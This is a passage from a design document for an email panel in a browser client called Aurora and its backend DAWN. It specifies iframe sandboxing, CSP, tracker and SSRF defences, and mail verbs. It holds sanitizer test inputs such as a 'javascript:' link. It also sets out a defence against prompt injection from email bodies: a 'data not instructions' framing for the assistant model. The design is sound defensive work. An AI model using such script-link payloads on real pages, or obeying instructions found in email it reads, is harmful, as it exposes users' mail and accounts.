   image route by PATH (`https://<dawn-host>/api/email/image/`); `font-src 'none'; media-src 'none';
   form-action 'none'; base-uri 'none'; frame-src 'none'`. Also set as the iframe's `csp` attribute
   (CSP Embedded Enforcement: Chromium, applied before parsing); the meta stays the cross-browser
   control. A srcdoc also inherits any CSP DAWN serves Aurora with.
4. **The frame:** create the iframe and set `sandbox="allow-popups allow-popups-to-escape-sandbox"`,
   `csp`, `credentialless` (Chromium: an ephemeral cookie partition), and `referrerpolicy` FIRST, then
   `srcdoc`, then insert it (sandbox flags are captured at navigation; srcdoc before sandbox would load
   the first document unsandboxed and same-origin). Never change `sandbox` afterwards, never give it a
   `name`. No scripts, no same-origin (ever: the parent never reads the frame), no forms, no top
   navigation, no bridge script, no postMessage handler. It sits in a wrapper with `overflow:hidden;
   contain:strict`, so its layout box can never spill over the reader bar.
5. **Zoom without reading the frame.** The parent knows the design width (fit-images.ts
   `designWidth`, from its own inert parse). The frame is laid out at that width (or `readerWidth/0.6`
   at the floor) with `transform: scale(...)` (never above 1, never below 0.6), `transform-origin: top
   left`, and height `readerHeight / scale`. A resize changes only the transform. Unknown design
   width: no scaling, width 100%. (The transform shrinks the frame's scrollbar and wheel step; CSS
   `zoom` on the injected `:root`, rebuilt on resize end, would keep them native. Decide before 2b.)

**Images in Layout.** Remote images arrive with 2b, not before. With `img-src https:` (2a's
direct-loading alternative), the sender's own CSS could fetch anything after Show images (hover and
click beacons via `url()`, `image-set()`, `cursor`, `content`, escaped forms no filter catches; a
host-list CSP doesn't help, it ignores the query string), bypassing the image choke point. In 2b the
CSP admits only DAWN's token route, whose URLs sender CSS never sees, so `<img>` images load and CSS
images stay blocked. Until then Layout shows the layout with image placeholders, and Show images
applies to the Reading view. (The alternative, stripping CSS URLs through a CSSOM pass in 2a, is work
2b makes redundant.)

**What it does NOT do:** run anything the sender wrote; load fonts or remote CSS; fetch any remote
image before 2b; send Aurora's origin as a referrer; carry cookies (opaque origin, `credentialless`).

**Accepted risks:** sender CSS can draw fake UI inside the frame (display only: no forms, links open a
new tab; the paper and border keep it distinguishable); a `cursor` image can restyle the pointer over
the frame; heavy CSS animation or a decompression-bomb data: image can cost the tab while that message
is open in Layout (the frame is destroyed on leaving it).

**Phasing.** 2a: the Layout toggle, sanitizer, document builder, frame, zoom, and UX above, with
image placeholders. 2b (with 9.13): images through DAWN's token route.

**Tests (2a):** the sanitized frame document has no URL attribute except `a[href]`; `<body
background>` / `<td background>` / `<video poster>` / `srcset` come out with no URL; our CSP is the
first `<head>` child and no sender meta/base survives; `iframe.sandbox.value` is exactly
`allow-popups allow-popups-to-escape-sandbox` and is set before `srcdoc`; tracking pixels are dropped;
a `<style><!-- ... --></style>` newsletter keeps its styles (or the drop is documented).

**Reader follow-up found by this review:** the Reading view's `loading="lazy"` is also a reading-depth
signal once images are shown; switch it to eager loading.

### 6.5 Tests

The walker and sanitizer run under vitest with a DOM environment (`jsdom` as a dev dependency,
via a per-file `@vitest-environment` pragma; no bundle impact). happy-dom was tried and rejected:
DOMPurify's output under it silently drops hook mutations, so it can't verify the sanitizer. Required assertions: no output
element carries a URL attribute other than `a[href]` (absolute http(s)/mailto) and `img[src]` only
when shown; attacker text containing `<img>` / `![]()` / `[x](javascript:)` renders inert; relative
and same-origin URLs are dropped.

## 7. Live updates and notifications

### 7.1 Subscription rule

`subscribed = panelEffective || (panelShown && anyNotifyOn && linkLive)`, where `panelEffective` = shown AND
expanded AND not standby AND the tab not away (the Stocks pattern; a hidden tab counts as away only after
a 3-minute grace, `src/util/tab-away.ts`, so a quick tab hop changes nothing). Marking read and the
"is a bell redundant" check use the raw tab visibility instead, with no grace. Coming back into view
refreshes the list in place: the loaded pages are re-read (until they reach the oldest loaded row)
and swapped in without blanking, keeping the scroll and the open message, with new mail behind the
"new" pill while the user is scrolled. The view computes it (it owns the
prefs); DawnIngest stores the intent and replays it on reconnect. Standby suspends only the
`panelEffective` half, because standby and a hidden tab are exactly when a notification matters. Turning the
panel OFF (Panels menu) silences it entirely, notifications included: the bells live in the panel,
so an off panel must not raise cards the user can't trace. Collapsed keeps listening.
No subscriber = DAWN doesn't poll.

### 7.2 Applying changes

DAWN pushes `email_changed { account_id, state, created, updated, destroyed }` (9.7), and the panel
applies all three sets, so a message read, archived, or trashed from a phone or by the assistant
updates every open panel.
- `created` rows insert only if they match the current filter (Unread only -> unread rows only).
  During an active search nothing is injected; a "New mail · Clear search" pill shows instead.
- **No scroll yank:** if the list is scrolled down, OR the pointer is over the list, OR a row has
  keyboard focus, new rows wait behind a "3 new" pill (top-center, accent outline; click scrolls to
  top). Otherwise they insert and `scrollTop` is adjusted by the inserted height.
- Arrival wash: `--accent` 8% fading over 1.5 s; under reduced motion a static 2 px accent tick
  until hovered or opened. The selected row stays selected.
- `updated` re-renders flags in place; `destroyed` removes the row (closing the reader with the
  not-found line if it was open).
- On reconnect, Aurora resubscribes and calls `email_changes` with its last `state` per account;
  `CANNOT_CALCULATE` -> reload that account from the top.

### 7.3 Notifications (opt-in, per account)

- Per-account "Notify me of new mail", off by default.
- Placement (all notification cards, not only mail): `src/render/placement.ts` finds the free
  spot nearest top center, clear of every visible panel and card, the menubar, the conversation
  window, and the reactor; top center if the display is full. Once the user moves a card, its
  stored position wins.
- A notification card (`src/notify/`, ambient tone, never alert) per account, **coalescing**
  arrivals within ~30 s ("3 new · Work", latest sender + subject). Respects engagement dim.
- A **"sender only"** option hides the subject on cards, for shared screens.
- Click opens the message in the panel (expanding it if collapsed; cards only fire while the panel is on).
- **Notice id is per account (`mail-new:<accountId>`)**, never per message and never sender/subject
  text: the notify layer persists `aurora.notice.<id>.*` positions to localStorage, so a message id
  or subject in the id would put mail into browser storage.

## 8. Aurora architecture

### 8.1 The EmailSource boundary

- `src/ingest/email.ts` defines `interface EmailSource { attach(sink: EmailSink); detach(); list();
  search(); read(); setFlags(); archive(); trash(); undo(); unreadCounts(); changes();
  setSubscription(want) }` plus the shared types (`Row`, `Message`, `EmailRef`, error codes).
- `DawnIngest implements Ingest, EmailSource`, with the wire code in a helper module
  (`src/ingest/email-wire.ts`) it delegates to, not inline in the 5000-line `dawn-ws.ts`.
- `EmailSim implements EmailSource` (`src/ingest/email-sim.ts`). It never touches a socket, so
  DawnIngest stays the only DAWN boundary.
- **The email sink is NOT in `IngestSinks`.** It is bound by `attach`, so exactly one source ever
  feeds the panel (the sim and live frames can never both drive it).
- `main.ts` picks the source and injects it into `mountEmailPanel(stage, { source, ... })`; the
  panel depends only on `EmailSource`.
- The sim is excluded from production builds:
  ```ts
  let emailSource: EmailSource = dawn;
  if (import.meta.env.DEV && new URLSearchParams(location.search).get("email") === "sim") {
     const { EmailSim } = await import("./ingest/email-sim.ts");
     emailSource = new EmailSim();
  }
  ```
  Never imported statically; verified after `npm run build` by grepping `dist/` for a sim-only string.

### 8.2 Cross-view wiring (through main.ts only)

- **Send to chat:** the panel calls `opts.onDiscuss(ref, { newChat })`; main.ts calls
  `conversation.addEmailRef(ref)` (new conversation API) and, for newChat, the ingest's
  `newConversation({ private: true })` first (section 4). The composer passes refs through its
  existing submit attachments argument (`emailRefs`). `EmailRef` lives in `src/ingest/email.ts`;
  neither view imports the other. Chip re-render on reload lives in
  `src/conversation/attachments.ts` beside the IMAGE / DOCUMENT parsers.
- **Notifications:** the panel applies the opt-in filter and calls `opts.notify(notice)`; main.ts
  binds it to the standby-decorated `notifications.notify`. `Notice` gains a discriminated
  `open?: { kind: "conversation"; id } | { kind: "email"; accountId; messageId }`, and main.ts routes
  the email kind to `emailPanel.openMessage(ref)`. The notify layer never imports `email/`.

### 8.3 Markdown module

The email pipeline (6.1 step 4) lives in `src/email/` and builds its own Marked and DOMPurify
instances; it shares nothing with the chat's `renderMarkdown`. (`renderMarkdown` has since moved out
of `src/conversation/format.ts` to `src/render/markdown.ts`, so the doc viewer no longer reaches into
the conversation view for it. Mail is not a consumer.)

### 8.4 Feature gate

`EmailSink.setAvailability("unknown" | "available" | "unavailable")`: DawnIngest pushes it on every
`config` frame (from `email_client`); the sim pushes "available". DawnIngest refuses to send any
email verb without the flag (an older DAWN silently drops unknown verbs, which would be a timeout).

### 8.5 State lifetime

- Messages, bodies, search queries, the open message, undo tokens, and (P2) compose drafts live
  **in memory only**. Logout, revoke, and a user switch already reload the page, which clears all of
  it. Bodies are never logged.
- One per-user pref key, `dawn.hero.mailPrefs` (JSON: account filter, per-account notify, sender-only),
  **added to `USER_KEYS`** (it embeds account ids).
- Layout (position, size, collapse, panel visibility) is per-machine like every other panel, NOT in
  `USER_KEYS`.
- A test asserts the email modules write no storage key beyond the listed ones.

### 8.6 Charter

Reads plus the user's own-mailbox writes (mark read, archive, trash, undo; P2 send). User-scoped,
deliberate, user-initiated; no operator/admin/global reach; nothing depowers the daemon. Trash is
confirm-free only because it is recoverable (section 5). **Send (P2) is the highest-stakes write in
Aurora** (outward-facing, irreversible): explicit review, a server-held undo window, send only from
an explicit button press (never a keyboard default, frame path, or auto-advance), and when
`Reply-To` differs from `From` the compose view shows the real recipient clearly. No account setup
or credentials in Aurora.

### 8.7 User settings: the UserPrefs boundary (2026-10-08)

Aurora-wide, first used by Mail (3.9); other panels adopt it later without touching ingest.

- **`src/ingest/prefs.ts`** (no socket): `PrefDef<T> { key, default, parse(raw): T | undefined }`,
  `definePref()` (checks the key: `[a-z0-9._-]`, <= 64 bytes, namespaced by view, at module load);
  `UserPrefs { get(def), set(def, value), onChange(cb) -> unsubscribe, synced(), dispose() }`; and
  `LocalUserPrefs`: one map in `dawn.hero.prefs` = `{ v: 1, values, authority: "local" | "dawn",
  dirty: [] }`, plus a `storage` listener so other tabs follow on the browser-only path.
- **Ingest stores raw JSON per key and knows nothing about meaning.** Each view owns its typed defs
  (`src/email/mail-prefs.ts`); `get` runs `def.parse(raw)` and falls back to `def.default`. Values are
  parsed into `Object.create(null)` maps and looked up with `Object.hasOwn` (a key like `constructor`
  can't resolve to a prototype member). Per-key rules: booleans exactly booleans, enums exact, the
  trusted list an array, re-normalized, de-duplicated, capped by BYTES so its JSON fits 9.14's value cap.
- **`src/ingest/prefs-wire.ts`: `DawnPrefs`** wraps a `LocalUserPrefs` (the store without the flag,
  the cache with it). DawnIngest delegates like DawnEmail: `setServerSupport(hasFeature
  ("client_prefs") && hasFeature("app_logins"))` from the config frame (before email's, so the get
  goes out first), `setLinked()`, and `handleFrame()` for the three frames. `userPrefs(): UserPrefs` is
  on the `Ingest` interface; StubIngest returns a `LocalUserPrefs`, so the stub swap stays one line for
  this source. main.ts injects it: `mountEmailPanel(stage, { source, prefs, ... })`.
- **Lifecycle.**
  - Reads return the cache (or defaults in a brand-new browser) at once; when DAWN's values arrive,
    only changed keys are notified and the panel re-applies just those settings.
  - A write updates the cache, notifies this tab, then sends; offline or failed, the key is marked
    dirty and re-sent after the reconnect's get (the user's latest choice wins). Every reconnect gets
    again (recovers changes missed while offline). `client_prefs_changed` triggers a get.
  - **Trusted senders are edited as add/remove operations**, sent with compare-and-set (9.14
    `expect`): on a mismatch Aurora re-reads, re-applies the operation to the fresh list, and retries;
    a removal is never undone by another device's stale write.
  - If the flag disappears mid-page, the local map takes over with no gap.
- **The one-time upload.** While `authority` is `"local"`, the map is the truth. On the first get from
  a DAWN with the store, AFTER the user-identity check (and any user-switch wipe and reload), keys DAWN
  lacks are sent with set-if-absent (atomic on the server), excluding `mail.trusted_senders` and
  `mail.always_images` (privacy-loosening; they start fresh, and are new anyway). Then `authority`
  becomes `"dawn"` and the map is only a cache. The legacy `senderOnly` inside `dawn.hero.mailPrefs`
  moves into the map at mount (a one-shot local step), so the upload carries it. Edge (documented): a
  daemon downgraded then upgraded keeps DAWN's values over local edits made in between.
- **Wipe.** `dawn.hero.prefs` is in `USER_KEYS`; logout and a user switch wipe and reload it, so the
  next user's upload has nothing of the previous user's. §8.5's storage-key test covers it.
- **HMR:** `DawnIngest.dispose()` disposes the prefs (listeners, the `storage` listener, dirty state);
  the panel's `destroy()` unsubscribes.

## 9. What DAWN needs to add

### 9.0 Live issues found in review (exist today, independent of Aurora)

1. **The send/trash confirm is model-mediated, intentionally.** `email_service_confirm_send` /
   `_confirm_trash` check that the draft/pending id exists, belongs to the user, and is unexpired;
   the user's approval is conversational (the model asks, the user says yes), which suits voice.
   The owner confirmed this is by design. **Ask:** document the intent and its threat model in the
   DAWN code and a design doc, so a later reviewer doesn't "fix" it. **Done + hardened (DAWN
   78fe42d3, owner-approved):** still conversational, but a confirm is accepted only in the same
   session's very next user turn, and the tool's send/trash/archive are refused outside a live
   user turn (jobs, background, scheduled, MQTT). The panel's verbs are unaffected (the click is
   the confirmation).
2. **IMAP trash/archive ends in a bare `EXPUNGE`** (`imap_move_message`): it permanently deletes
   EVERY `\Deleted` message in the source folder, including mail another client flagged but kept.
   Fix in P1.0 (9.1).
3. **Trash/Archive folder names are hardcoded** (`"Trash"`, `"Archive"`, `"[Gmail]/..."`), so trash
   and archive fail on Outlook/Exchange ("Deleted Items"), iCloud ("Deleted Messages"), and servers
   without an Archive. Fix in P1.0.
4. **The email tool hands the model raw bodies/snippets with no untrusted-content wrapper.** The
   shared wrapper (9.8) is the proposed fix; it goes through a proper DAWN-side security review
   before it is designed in detail.

### 9.1 P1.0 foundations (no UI)

- **Capabilities + folder roles:** probe `CAPABILITY` and `LIST (SPECIAL-USE) "" "*"` per account,
  cached; resolve `\Trash` / `\Archive` with a name-table fallback (Trash, Deleted Items, Deleted
  Messages, ...); optionally `CREATE` an Archive when none exists (Thunderbird's behaviour). A
  per-account override in DAWN's WebUI later.
- **Safe move:** `UID MOVE` when `MOVE` is advertised, else `UID COPY` + `UID STORE +FLAGS
  (\Deleted)` + `UID EXPUNGE <uid>` (UIDPLUS). **Never bare `EXPUNGE`.** Capture `COPYUID` (the
  destination UID) for undo. No Trash folder -> `NO_TRASH`, never an expunge.
- **MIME read pipeline:** both backends -> raw RFC822 -> GMime (the dependency DAWN already chose for
  attachment downloads) -> `{ body_text, body_html (decoded, UTF-8), attachments[]
  (metadata) }`. When the bounded fetch cuts the raw message, set `text_truncated` /
  `html_truncated` (GMime on a cut part is silently partial). Align the WS `body_html` cap with the
  fetch size (or raise the fetch for the WS path).
- **Error codes** on every per-account / per-message failure: `AUTH_REVOKED | AUTH_FAILED |
  UNREACHABLE | TIMEOUT | RATE_LIMITED | READ_ONLY | NOT_FOUND | CURSOR_STALE | FOLDER_MISSING |
  NO_TRASH | CANNOT_CALCULATE | UNSUPPORTED_QUERY` (`AUTH_REVOKED` from the OAuth refresh's
  `invalid_grant`). In-memory state (undo tokens, the snapshot, pollers) doesn't survive a daemon
  restart: `email_undo` then fails with a coded error and `email_changes` returns CANNOT_CALCULATE.
- **Concurrency:** a bounded email worker pool off the lws thread, sending results through the conn
  registry (the stocks refresher's rule: never deref a `conn*` after releasing the registry lock);
  per connection at most one list/search plus one read in flight (a newer list supersedes an older
  one); provider concurrency 1 per account (IMAP servers cap connections per account).
- **Gate:** a base64 `multipart/alternative` reads correctly over IMAP; trash works on a server with
  "Deleted Items"; a message another client marked `\Deleted` survives an Aurora trash.

All verbs below are per-user (`conn->auth_user_id`), ownership-check every account id (including
ids inside a cursor), and reply `<verb>_response { success, error_code?, error?, ... }`.

### 9.2 List and search (P1.1)

```
email_list   { account_ids?: int[], folder?: "inbox", unread_only?: bool, cursor?: string, limit?: int }
email_search { account_ids?: int[], query: string, unread_only?: bool, cursor?: string, limit?: int }
-> { success, rows: Row[], cursor: string|null,
     partial: [{ account_id, error_code, error }] }

Row = { account_id, message_id, thread_id?, from_name, from_addr, subject,
        date (epoch s, server receive time), preview, unread, starred?, important?,
        has_attachments? }
```

- Omitted `account_ids` = all the user's enabled accounts. `limit` default 25, max 50.
- **Merged cursor:** a versioned base64 JSON of per-account `{ id, token, skip }` (the provider page
  being drained plus how many of its rows were already emitted), with the filter it belongs to
  (`account_ids`, `unread_only`, `query`) bound in. Presented against a different filter, an unowned
  account, a changed UIDVALIDITY, or a provider "invalid page token" -> `CURSOR_STALE`. The
  per-account `page_token` buffer (256) is too small for the composite; size it accordingly.
- Within an account keep provider order (IMAP is UID-descending, not strictly date-descending); the
  merged list may be slightly non-monotone in date, which is acceptable and documented.
- **Resume by key, not by count, where the provider allows it.** A `skip` count goes wrong when the
  page's contents change between requests (a message read under Unread only, archived, or newly
  arrived shifts every later position, skipping or repeating rows). Prefer resuming each account
  after its last emitted `(date, message_id)` (IMAP: `UID < last`, which the existing `u<uid>`
  token already does), using `skip` only inside a Gmail page.
- Search across accounts pages (today it is first-page-only).
- `query`: one free-text box; Gmail `q`, IMAP `SEARCH TEXT`. IMAP non-ASCII search needs a literal
  the libcurl custom path can't send: if servers reject 8-bit in a quoted string, IMAP search is
  ASCII-only, and a non-ASCII query puts that account in `partial` with `UNSUPPORTED_QUERY` (never
  silently empty results).
- `date` is IMAP `INTERNALDATE` / Gmail `internalDate`, not the `Date:` header.
- A per-account failure goes in `partial`; the other accounts still return rows.

### 9.3 Read (P1.1)

```
email_read { account_id, message_id, mark_read?: bool (default true) }
-> { success, message: {
        account_id, message_id, thread_id?, subject, from_name, from_addr,
        to: [{name, addr}], cc: [{name, addr}], to_total?, cc_total?,   // totals when cut at 32
        reply_to?: {name, addr}, date,
        body_text, body_html?, text_truncated, html_truncated,
        attachments: [{ part_id, filename, mime, size, inline, content_id? }],
        attachments_truncated?
     },
     unread: bool }   // the state AFTER the call
```

- `body_html` is the decoded, charset-converted HTML part (not transfer-encoded bytes), raw (Aurora
  sanitizes), capped at 1 MB for the panel (the IMAP fetch is 2 MB) with `html_truncated`. Not found
  -> `NOT_FOUND`. (Agreed with DAWN 2026-10-02.)

### 9.4 Read marking (P1.1)

- `BODY.PEEK[]` is not available through libcurl's URL fetch (and the custom-command path drops
  literals), so: IMAP reads via the URL fetch (which sets `\Seen`); if `mark_read:false` and the
  message was unread, DAWN immediately restores it with `UID STORE <uid> -FLAGS (\Seen)` (a
  sub-second window, documented). Gmail `format=full` doesn't mark, so `mark_read:true` =
  `messages.modify removeLabelIds:[UNREAD]`. Both backends end in the same state.
- ```
  email_set_flags { account_id, message_ids: string[], unread?: bool, starred?: bool }  // starred P3
  -> { success, updated: string[], failed: [{ message_id, error_code, error }] }
  ```
  Gmail `messages.batchModify`; IMAP `UID STORE +/-FLAGS (\Seen)`. Naturally idempotent.

### 9.5 Archive, trash, undo (P1.2)

```
email_archive { account_id, message_ids: string[] }
email_trash   { account_id, message_ids: string[] }
-> { success, done: [{ message_id, undo }], failed: [{ message_id, error_code, error }] }

email_undo { account_id, undo: string[] }
-> { success, restored: [{ undo, row: Row }], failed: [{ undo, error_code, error }] }
```

- `email_list_accounts` (or the account rows the panel gets) should carry a `can_trash` capability,
  so Aurora can show Trash disabled with the reason up front on an account with no Trash folder
  instead of only learning it from a `NO_TRASH` refusal.
- Single step from the UI (the deliberate gesture plus undo is the confirm). The LLM tool keeps its
  own (fixed, 9.0) confirm. `read_only` -> `READ_ONLY`. No permanent-delete verb.
- **Undo tokens:** opaque, single-use, owner-bound, ~30 s expiry, bounded per user, dropped when the
  account is disabled.
  - Gmail: record the pre-action `labelIds`; trash undo = `untrash` + `modify addLabelIds:[prior]`
    (don't rely on untrash restoring labels); archive undo = `addLabelIds:[INBOX]`.
  - IMAP: move back from the resolved folder to the source using the captured `COPYUID`; the message
    gets a new UID again, so `restored[].row` carries the new `message_id`.
- A second trash of a gone id -> `failed[{NOT_FOUND}]`.
- **Move outcomes from P1.0a (DAWN 072535d2) to map onto these verbs in P1.2:** `NOT_FOUND`,
  `NO_TRASH`, `FOLDER_MISSING`, `ALREADY_THERE` (already in the target folder: treat as done, no
  undo), `LEFT_FLAGGED` (a server without MOVE/UIDPLUS: copied and marked \Deleted but still in
  its folder; Aurora should hide the row, since the move happened, and say it stays flagged until
  the server expunges), `NOT_REMOVED` (copied but the original couldn't be removed: a failure the
  panel must NOT auto-retry, since a retry may duplicate). DAWN to say which land in `done[]`
  (with what flag) vs `failed[]`.
- DAWN-originated changes (these verbs, and the LLM tool's archive/trash) push `email_changed`
  synchronously (9.7), so other tabs learn.

### 9.6 Unread counts and account status (P1.1)

```
email_unread_counts {} -> { success, accounts: [{ account_id, inbox_unread, status }] }
status = "ok" | "auth_revoked" | "auth_failed" | "unreachable"
```
Gmail `labels.get INBOX` `messagesUnread` (all category tabs, matching `in:inbox is:unread`);
IMAP `STATUS INBOX (UNSEEN)`.

### 9.7 Live updates: state + changes (P1.3)

JMAP-shaped deltas over DAWN's existing push transport (no "new only" frame; it would be replaced
later):

```
email_subscribe   { account_ids?: int[] }   // replaces this connection's previous subscription
email_unsubscribe {}
push email_changed { account_id, state, created: Row[], updated: Row[], destroyed: message_id[] }
push email_unread_changed { accounts: [{ account_id, inbox_unread, status }] }
email_changes { account_id, since_state }
-> { success, state, created, updated, destroyed } | { success:false, error_code:"CANNOT_CALCULATE" }
```

- **Gmail:** `state` = `historyId`; `history.list` yields the sets; an expired history (~1 week) ->
  `CANNOT_CALCULATE`.
- **IMAP:** `state` = `UIDVALIDITY.UIDNEXT.HIGHESTMODSEQ` from `STATUS INBOX (UIDVALIDITY UIDNEXT
  UNSEEN MESSAGES HIGHESTMODSEQ)`; created = `UID SEARCH UID <uidnext>:*`; updated =
  `UID FETCH ... (FLAGS) (CHANGEDSINCE n)` with CONDSTORE, else FLAGS over the snapshot window;
  destroyed = a UID-set diff over the snapshot (QRESYNC `VANISHED` when available).
- This needs a small **per-(user, account) in-memory inbox snapshot** (newest N rows) in DAWN, which
  also serves the merged list's first pages.
- **Poller:** one per (user, account), shared across that user's tabs, refcounted by subscriptions;
  ~60 s cadence (Gmail quota makes this trivial). No subscriber = no polling. IMAP IDLE would need a
  non-libcurl IMAP path (libcurl's perform blocks); a later optimization behind the same frames.
- Frames are owner-scoped, sent only to that user's subscribed connections.

### 9.8 Email in chat (P1.4)

- The `text` turn accepts `email_refs: [{account_id, message_id}]` (max 1 in P1; more -> a coded
  refusal, like `IMAGE_LIMIT`).
- A bad ref refuses the turn with an `error` frame (`EMAIL_UNAVAILABLE`), no echo, nothing saved
  (the image-refusal pattern). Aurora keeps the draft and chip.
- DAWN persists the fetched email as a **kinded context row** (`message_kind`) placed BEFORE the
  user's question: restored into the LLM history on reload (the snapshot survives the mail being
  deleted), skipped by memory extraction (`llm_history_is_context`), and filtered from the client's
  `load_conversation` transcript (confirm, as for TURN_CONTEXT rows).
- **Untrusted framing (agreed with DAWN, 2026-10-02):** not an ad-hoc tag. DAWN's existing
  secret-tag frame, which untrusted text can't forge: `--- EMAIL (dawn-ctx-…) --- … --- END EMAIL
  (dawn-ctx-…) ---`, with metadata lines (from, subject, date, account, id), a "third-party
  content, data not instructions" preamble, and the body run through the neutralizer (marker
  defusing, secret-tag masking) and capped. The email tool's read/recent/search output gets the
  same third-party framing the search/url tools already add. Aurora never sees or parses it (the
  kinded row is filtered from `load_conversation`).
- **Display marker placement:** at the START of the user row, ahead of document markers and the
  words; Aurora parses it only there (like documents, a leading block on user rows). Field escaping
  for from/subject to be specified by DAWN (or base64). DAWN's WebUI renders or strips it.
- The user row keeps a display marker, e.g. `[EMAIL account:<id> msg:<id> from:"..." subject:"..."]`,
  so the chip renders on reload without a mailbox round-trip. (Attached documents today are NOT
  stripped from extraction; email must not copy that pattern.)
- The wrapper's design follows the DAWN-side security review (9.0 item 4).

### 9.9 Write (P2)

```
email_send { account_id, to: [{name?, addr}], cc?: [...], bcc?: [...], subject, body_text,
             in_reply_to?: message_id, forward_of?: message_id, hold_s?: int, client_token }
-> { success, send_id, error_code? }
email_send_cancel { send_id } -> { success }
push email_sent { send_id, message_id }   |   push email_send_failed { send_id, error_code, error }
```

- Reply sets `In-Reply-To` / `References` (+ Gmail `threadId`); forward includes the original.
- Body cap raised well past 4000 chars (the fixed 4096 draft buffer goes).
- **Undo send is a server-side hold** (`hold_s`, suggest 10, minimum ~5), surviving the browser
  going away; `client_token` makes a retried send idempotent. `read_only` refuses; a send rate limit
  applies.
- Assistant-originated sends keep DAWN's conversational confirm (9.0 item 1); an optional
  mandatory hold on them too is worth considering in P2.
- Optional server-side drafts (`email_draft_save` / list / delete).

### 9.10 Depth (P3)

- **Add to Library:** a verb (or an HTTP POST) that copies one attachment part into the user's
  document library (`doc_library_*`), extracting text the same way a document upload does; only
  for the formats the library can index. A user-scoped write on their own data.
- **Attachment route:** `GET /api/email/attachment?account=&message=&part=`, built in the ingest with
  `URLSearchParams` then `dawnUrl()` (IMAP ids contain `:` `/` spaces and could smuggle parameters if
  concatenated). Owner-checked. Always `Content-Disposition: attachment`, `nosniff`,
  `Content-Security-Policy: sandbox`, and `application/octet-stream` for anything outside a raster
  image allowlist. Inline `cid:` parts served only as allowlisted raster types (never SVG).
  Downloads go through `<a href download>` to the route, never fetch -> `blob:` -> `window.open`.
  Shares the GMime parser with the turn-only attachment design.
- `email_thread { account_id, thread_id }` (Gmail `threads.get`; IMAP References/subject grouping).
- `email_folders` returning structured `{ id, name, role, unread }`.

### 9.11 Flags and docs

- Feature flags (signal-map §9.15), so P1 can ship in drops: `email_client` (the panel verbs,
  P1.1-P1.3), `email_refs` (the turn field, P1.4), `email_write` (P2).
- Write up every email verb (including the existing account-admin ones) and the flags in
  `WEBSOCKET_PROTOCOL.md`.

### 9.12 DAWN build order

| Drop | Contents | Gate |
|---|---|---|
| **P1.0** | 9.0 items 1-3 (1 = documentation), capability/role probe, safe move, GMime read, error codes, worker pool | the 9.1 gates |
| **P1.1** | `email_list`, `email_search`, `email_read`, `email_set_flags`, `email_unread_counts`, flag `email_client` | Aurora panel live against DAWN with manual refresh |
| **P1.2** | archive / trash / undo + DAWN-originated `email_changed` | one-click triage with undo on Gmail and IMAP |
| **P1.3** | snapshot + poller, `email_subscribe`, external `email_changed`, `email_changes` | a phone-side archive disappears from Aurora within a poll |
| **P1.4** | `email_refs`, kinded snapshot row, shared wrapper (also on the tool), flag `email_refs` | discuss-privately end to end; extraction verified to skip the email |

P1.3 and P1.4 are independent and can land in either order. 9.13 (image fetching) comes after them.

### 9.13 Image fetching: through DAWN, or an outside proxy (drafted 2026-10-07, not yet sent)

**Why.** Today "Show images" makes the browser load each image straight from the sender: no referrer
(set per image), but the sender sees the reader's IP and user agent, logs the open, and gets any
third-party cookies the browser still allows for its host (a plain `<img>` is a credentialed request),
which can tie messages together. Only the `dawn` / `proxy` modes fix the cookie part.
Gmail's proxy does not help: DAWN reads mail over IMAP, so the bodies carry the senders' own image
URLs. DAWN usually sits on the same home network as the browser, so DAWN fetching an image does NOT
hide the home IP; only a proxy outside that network does. No proxy stops the open event (whoever
fetches a tracking pixel triggers it); only not fetching known trackers does (Aurora's job, below).

**Three modes, chosen by the operator** (DAWN config, so set in DAWN's WebUI, never from Aurora):

| Mode | Who fetches | Hides the IP | Third party sees reading |
|---|---|---|---|
| `direct` | the browser, from the sender (today's behaviour) | no | no |
| `dawn` (proposed default) | DAWN | no (same home address) | no |
| `proxy` | DAWN, through a configured upstream (a self-hosted imgproxy / camo, or a service the operator chooses to trust) | yes | the upstream |

In `dawn` and `proxy` the browser only ever loads same-origin, so senders never see the browser at all.

**What DAWN adds:**

1. **No open fetcher.** DAWN must never fetch an arbitrary URL a client names (an SSRF into the LAN).
   `email_read` returns, per message, the https image URLs found in its HTML with a short-lived
   opaque token each: `images: [{ url, token }]`. The token binds user + account + message + URL
   (HMAC with a server key, expiring with the read, e.g. 1 hour). `GET /api/email/image/<token>`
   serves only a URL that token names. **The token alone authorizes; cookies are ignored on this
   route**: View original (6.4) loads images from an opaque-origin frame, and DAWN's `SameSite=Strict`
   login cookie never rides those requests. Response headers add `Cross-Origin-Resource-Policy:
   cross-origin` (a same-site CORP would block the opaque frame), `Cache-Control: private`,
   `Referrer-Policy: no-referrer`; no `Set-Cookie`, no CORS headers (images load no-cors), no redirects.
2. **Fetch rules** for both modes: https only; resolve the host and refuse loopback, private,
   link-local, CGNAT and multicast addresses, re-checked on each redirect and pinned to the resolved
   address (no DNS rebinding); at most 3 redirects; connect and total timeouts; a size cap
   (e.g. 5 MB); no cookies, no referrer, a fixed generic user agent; serve only png / jpeg / gif /
   webp after sniffing the bytes (never SVG, never the sender's content type alone), with
   `Content-Type` from the sniff, `X-Content-Type-Options: nosniff`, `Content-Disposition: inline`,
   and a restrictive CSP on the response.
3. **Cache** by URL with a TTL (repeat opens don't refetch, so the sender can't count reopens), bounded
   in size, wiped with the user's other email state. Tracking URLs are unique per recipient, so a
   shared cache leaks nothing across users.
4. **`proxy` mode:** a URL template plus an optional signing key in `secrets.toml` (imgproxy and camo
   both sign URLs with an HMAC so the proxy can't be used as an open relay). DAWN fetches the
   upstream's URL with the same rules (the upstream is the only host it contacts).
5. **Advertise it:** flag `email_image_fetch` (signal-map 9.15). The `images[]` list is present only
   in `dawn` / `proxy` mode; in `direct` mode (or an older DAWN) Aurora keeps loading from the sender
   as today.
6. Optional, later: re-encode fetched images (strips metadata and odd payloads) at a CPU cost.

**What Aurora does:**

- "Show images" stays off by default, per message.
- With `images[]`, the sanitize hook maps each image's URL to its same-origin token route (through
  `dawnUrl()`), the only same-origin image it allows; an image with no token stays blocked. The
  sender's intended size (6.2) carries through unchanged.
- Tracking pixels stay dropped before any fetch (1x1 / hidden today); a known-tracker host list is a
  later option. This, not the proxy, is what cuts open tracking.

**Open questions:** the default mode for a fresh install (recommended `dawn`); whether a per-user
"always show images from this sender" belongs here or with the parked per-sender option (2).

### 9.14 Per-user settings that follow the person (v2 2026-10-08, reviewed; not yet sent)

**Why.** Aurora keeps every setting in the browser, so a second browser starts from scratch and
trusted senders (3.9) would be re-trusted per device. `get_my_settings` / `set_my_settings` is a fixed
set of columns, not a place a client can keep its own settings.

